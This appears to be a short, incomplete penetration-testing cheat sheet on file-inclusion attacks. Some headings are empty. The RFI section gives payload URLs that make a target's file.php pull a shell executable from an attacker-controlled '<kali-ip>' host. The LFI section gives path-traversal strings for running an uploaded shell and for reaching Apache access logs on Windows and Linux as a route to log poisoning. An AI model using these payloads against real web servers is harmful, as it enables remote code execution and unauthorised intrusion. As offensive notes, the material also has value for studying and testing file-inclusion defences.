#### Identifying
```

```

#### Exploiting
##### RFI
```
#Check whether you can request a file from a remote server.
1. http://example.com/file.php?file=http://<kali-ip>/myshell.exe
2. http://example.com/file.php?file=//<kali-ip>/kali/myshell.exe
```
##### LFI
```
#Check whether we can execute local files. Is there a way to upload prior perhaps?
1. http://example.com/file.php?file=/../../../var/www/html/myshell.exe

#Check whether we can poison log files.
	#Check can you read / access the log file? This a good first indication that might be the attack path.
	#Apache
	1. Windows: http://example.com/file.php?file=/../../../xampp/apache2/logs/access.log | /../../../xampp/apache/logs/access.log
	2. Linux: http://example.com/file.php?file=/../../../var/log/apache2/access.log | /../../../var/log/apache/access.log
	3. 
```
##### PT
```

```
